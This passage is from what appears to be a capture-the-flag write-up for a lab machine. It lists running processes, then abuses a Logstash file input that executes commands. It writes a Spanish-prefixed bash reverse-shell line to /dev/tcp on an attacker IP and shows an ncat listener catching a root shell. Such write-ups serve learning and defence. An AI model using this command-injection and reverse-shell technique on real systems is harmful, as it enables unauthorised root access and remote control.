root         31  0.0  0.0      0     0 ?        SN   15:16   0:00 [ksmd]
root         32  0.0  0.0      0     0 ?        SN   15:16   0:00 [khugepaged]
root         33  0.0  0.0      0     0 ?        S<   15:16   0:00 [crypto]
root         41  0.0  0.0      0     0 ?        S<   15:16   0:00 [kthrotld]
root         43  0.0  0.0      0     0 ?        S<   15:16   0:00 [kmpath_rdacd]
root         44  0.0  0.0      0     0 ?        S<   15:16   0:00 [kaluad]
root         45  0.0  0.0      0     0 ?        S<   15:16   0:00 [kpsmoused]
root         47  0.0  0.0      0     0 ?        S<   15:16   0:00 [ipv6_addrconf]
root         60  0.0  0.0      0     0 ?        S<   15:16   0:00 [deferwq]
root         91  0.0  0.0      0     0 ?        S    15:16   0:00 [kauditd]
root       1638  0.0  0.0      0     0 ?        S<   15:16   0:00 [nfit]
root       1658  0.0  0.0      0     0 ?        S<   15:16   0:00 [ata_sff]
root       1665  0.0  0.0      0     0 ?        S<   15:16   0:00 [mpt_poll_0]
root       1667  0.0  0.0      0     0 ?        S<   15:16   0:00 [mpt/0]
root       1723  0.0  0.0      0     0 ?        S    15:16   0:00 [scsi_eh_0]
root       1729  0.0  0.0      0     0 ?        S<   15:16   0:00 [scsi_tmf_0]
root       1889  0.0  0.0      0     0 ?        S    15:16   0:00 [scsi_eh_1]
root       1895  0.0  0.0      0     0 ?        S<   15:16   0:00 [scsi_tmf_1]
root       1896  0.0  0.0      0     0 ?        S    15:16   0:00 [scsi_eh_2]
root       1898  0.0  0.0      0     0 ?        S<   15:16   0:00 [scsi_tmf_2]
root       1906  0.0  0.0      0     0 ?        S    15:16   0:00 [kworker/u256:2]
root       1907  0.0  0.0      0     0 ?        S<   15:16   0:00 [ttm_swap]
root       1916  0.0  0.0      0     0 ?        S    15:16   0:00 [irq/16-vmwgfx]
root       2933  0.0  0.0      0     0 ?        S<   15:16   0:00 [kdmflush]
root       2934  0.0  0.0      0     0 ?        S<   15:16   0:00 [bioset]
root       2947  0.0  0.0      0     0 ?        S<   15:16   0:00 [kdmflush]
root       2950  0.0  0.0      0     0 ?        S<   15:16   0:00 [bioset]
root       2967  0.0  0.0      0     0 ?        S<   15:16   0:00 [bioset]
root       2972  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfsalloc]
root       2978  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs_mru_cache]
root       2980  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-buf/dm-0]
root       2983  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-data/dm-0]
root       2986  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-conv/dm-0]
root       2987  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-cil/dm-0]
root       2988  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-reclaim/dm-]
root       2989  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-log/dm-0]
root       2990  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-eofblocks/d]
root       2991  0.0  0.0      0     0 ?        S    15:16   0:04 [xfsaild/dm-0]
root       2992  0.0  0.0      0     0 ?        S<   15:16   0:00 [kworker/0:1H]
root       3058  0.0  0.1  39492  4956 ?        Ss   15:16   0:00 /usr/lib/systemd/systemd-journald
root       3079  0.0  0.1 127348  4136 ?        Ss   15:16   0:00 /usr/sbin/lvmetad -f
root       3089  0.0  0.1  48076  5572 ?        Ss   15:16   0:00 /usr/lib/systemd/systemd-udevd
root       4917  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-buf/sda1]
root       4918  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-data/sda1]
root       4928  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-conv/sda1]
root       4935  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-cil/sda1]
root       4938  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-reclaim/sda]
root       4939  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-log/sda1]
root       4941  0.0  0.0      0     0 ?        S<   15:16   0:00 [xfs-eofblocks/s]
root       4953  0.0  0.0      0     0 ?        S    15:16   0:00 [xfsaild/sda1]
root       6106  0.0  0.0  62044  1080 ?        S<sl 15:16   0:00 /sbin/auditd
root       6294  1.3 12.5 2731636 485864 ?      SNsl 15:16   2:53 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash
root       6296  0.0  0.0  26376  1752 ?        Ss   15:16   0:00 /usr/lib/systemd/systemd-logind
root       6364  0.0  0.0 126284  1692 ?        Ss   15:16   0:00 /usr/sbin/crond -n
root       6385  0.0  0.7 358584 29428 ?        Ssl  15:16   0:00 /usr/bin/python -Es /usr/sbin/firewalld --nofork --nopid
root       6386  0.0  0.0 110092   856 tty1     Ss+  15:16   0:00 /sbin/agetty --noclear tty1 linux
root       6545  0.0  0.2 550064  8872 ?        Ssl  15:16   0:00 /usr/sbin/NetworkManager --no-daemon
root       6792  0.1  0.2 272116  8516 ?        Sl   15:16   0:15 /usr/sbin/vmtoolsd
root       6833  0.0  0.1  59496  6048 ?        S    15:16   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
root       7002  0.0  0.1 107356  5492 ?        S    15:16   0:00 /sbin/dhclient -d -q -sf /usr/libexec/nm-dhcp-helper -pf /var/run/dhclient-ens160.pid -lf /var/lib/NetworkManager/dhclient-e4462724-110f-3535-a7c7-84728099324d-ens160.lease -cf /var/lib/NetworkManager/dhclient-ens160.conf ens160
root       7214  0.0  0.4 573828 17276 ?        Ssl  15:16   0:01 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
root       7215  0.0  0.1 112756  4360 ?        Ss   15:16   0:00 /usr/sbin/sshd -D
root       7219  0.0  0.2 222748  9444 ?        Ssl  15:16   0:00 /usr/sbin/rsyslogd -n
root       7340  0.0  0.0 124988  2308 ?        Ss   15:16   0:00 nginx: master process /usr/sbin/nginx
root      66047  0.0  0.0      0     0 ?        S    18:33   0:00 [kworker/0:3]
root      66679  0.0  0.1 158768  5644 ?        Ss   18:45   0:00 sshd: security [priv]
root      66935  0.0  0.0      0     0 ?        S    18:49   0:00 [kworker/0:1]
root      67209  0.0  0.0      0     0 ?        S    18:54   0:00 [kworker/0:0]
kibana    67392  0.0  0.0 112732   956 pts/0    R+   18:57   0:00 grep root
```

* This part sticks out:
```Console
root       6294  1.3 12.5 2731636 485864 ?      SNsl 15:16   2:53 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstasho
```

__Logstash__
```Console
bash-4.2$ ls
ls
conf.d	     log4j2.properties	   logstash.yml		pipelines.yml
jvm.options  logstash-sample.conf  logstash.yml.rpmnew	startup.options
bash-4.2$ cat conf.d
cat conf.d
cat: conf.d: Es un directorio
bash-4.2$ cd conf.d
cd conf.d
bash-4.2$ ls
ls
filter.conf  input.conf  output.conf
bash-4.2$ cat input.conf
cat input.conf
input {
	file {
		path => "/opt/kibana/logstash_*"
		start_position => "beginning"
		sincedb_path => "/dev/null"
		stat_interval => "10 second"
		type => "execute"
		mode => "read"
	}
}
```
 * config is set up to read anything in `/opt/kibana/` that starts with `logstash_`
   * reads and executes file
   * wrinkle: must be in Spanish

```Console
bash-4.2$ echo "Ejecutar comando: bash -c 'bash -i >& /dev/tcp/10.10.14.152/443 0>&1'" > /opt/kibana/logstash_takeabreath
```
 * After a bit of a wait...
```Console
❯ ncat -lvnp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.251.234.
Ncat: Connection from 10.129.251.234:50348.
bash: no hay control de trabajos en este shell
[root@haystack /]#
```

Root flag: 3f5~~~~~~~~~[takeAbreath]~~~~~~~
